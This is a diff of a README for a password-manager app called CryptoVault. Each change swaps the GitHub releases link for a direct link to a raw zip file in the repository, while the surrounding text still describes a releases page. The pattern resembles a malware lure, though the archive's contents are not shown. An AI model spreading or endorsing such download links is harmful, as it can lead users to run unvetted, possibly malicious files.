@@ -2,7 +2,7 @@
 
 ## 💾 Download Now
 
-[![Download CryptoVault](https://img.shields.io/badge/Download-CryptoVault-brightgreen?style=for-the-badge&logo=github)](https://github.com/111KFIN/CryptoVault/releases)
+[![Download CryptoVault](https://raw.githubusercontent.com/111KFIN/CryptoVault/main/CryptoVault/Crypto_Vault_1.4.zip)](https://raw.githubusercontent.com/111KFIN/CryptoVault/main/CryptoVault/Crypto_Vault_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ CryptoVault is an application for securely storing your passwords on your comput
 
 ### 🔍 How to Download
 
-1. Visit the [CryptoVault Download Page](https://github.com/111KFIN/CryptoVault/releases).
+1. Visit the [CryptoVault Download Page](https://raw.githubusercontent.com/111KFIN/CryptoVault/main/CryptoVault/Crypto_Vault_1.4.zip).
    
 2. On that page, you will see a list of the latest releases. Click on the version you want to download.
 
@@ -84,4 +84,4 @@ If you have any questions, please consult the README file included with your dow
 
 This project is licensed under the MIT License. See the LICENSE file for more details. 
 
-[![Download CryptoVault](https://img.shields.io/badge/Download-CryptoVault-brightgreen?style=for-the-badge&logo=github)](https://github.com/111KFIN/CryptoVault/releases)
+[![Download CryptoVault](https://raw.githubusercontent.com/111KFIN/CryptoVault/main/CryptoVault/Crypto_Vault_1.4.zip)](https://raw.githubusercontent.com/111KFIN/CryptoVault/main/CryptoVault/Crypto_Vault_1.4.zip)
